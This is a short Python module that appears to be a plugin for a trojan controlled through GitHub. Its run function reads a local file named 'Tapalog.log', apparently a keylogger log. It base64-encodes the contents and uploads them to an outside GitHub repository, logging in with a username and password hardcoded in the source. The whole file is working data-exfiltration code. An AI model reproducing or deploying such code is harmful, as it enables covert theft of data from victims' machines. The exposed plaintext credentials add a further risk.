from github3 import login
import json
import base64
import os

path = "others/"
filePath = base64.b64encode("Tapalog.log")
TargetOSfilePath = "Tapalog.log"

def connect_to_github():
	gh = login(username="MarvenGarsalli",password="1'mfor1am")
	repo = gh.repository("MarvenGarsalli","tro")
	branch = repo.branch("master")
	return gh,repo,branch

def store_module_result(data):
	gh,repo,branch = connect_to_github()
	remote_path= path+"sendFileToGit/"+filePath
	repo.create_file(remote_path,"Upload file %s"%filePath, base64.b64encode(data))
	return

def run(**args):
	try:
		fich = open(TargetOSfilePath, "rb")
		content = fich.read()
		fich.close()
		store_module_result(content)
		return "SendFileToGit: Successfully sent"
	except:
		return "SendFileToGit: File %s not found"% TargetOSfilePath
